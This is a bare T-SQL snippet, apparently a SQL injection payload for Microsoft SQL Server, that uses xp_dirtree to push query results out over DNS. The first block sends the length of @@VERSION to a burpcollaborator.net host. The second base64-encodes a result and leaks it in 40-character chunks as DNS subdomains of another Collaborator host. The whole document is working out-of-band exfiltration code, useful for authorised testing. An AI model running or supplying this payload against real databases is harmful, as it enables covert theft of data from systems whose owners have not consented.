/*==== get length of command's result ====*/
declare @a nvarchar(max), @b nvarchar(100);
set @a = (select @@VERSION); 
set @b = concat('\\\\', len(@a), '.604k9w9usevobc5n1sw5jr3u2l8jw8.burpcollaborator.net\\xda');
exec master.dbo.xp_dirtree @b;

/*==== OOB ====*/
declare @a nvarchar(max), @host nvarchar(70), @b nvarchar(200), @source VARBINARY(MAX);

set @host= 'q6xy4i93uj8m48w2sn8puz76xx3ord.burpcollaborator.net';
set @a= (select @@VERSION); -- query to executed

/* base64 encode */
set @source = CONVERT(VARBINARY(MAX), @a);
set @a = REPLACE (CAST('' AS XML).value('xs:base64Binary(sql:variable("@source"))', 'varchar(max)'), '=', '');

declare @i INT = 0, @nth INT = 0, @substr_len INT = 40;
WHILE (@i < len(@a)) BEGIN;
/* instructions set here */

set @b = SUBSTRING(@a, @i, @substr_len);
set @b = concat('\\', @nth + 1, '.', @b, '.', @host, '\xda');
-- select @b;
exec master.dbo.xp_dirtree @b; -- DNS OOB

set @nth += 1;
set @i += @substr_len; 
END;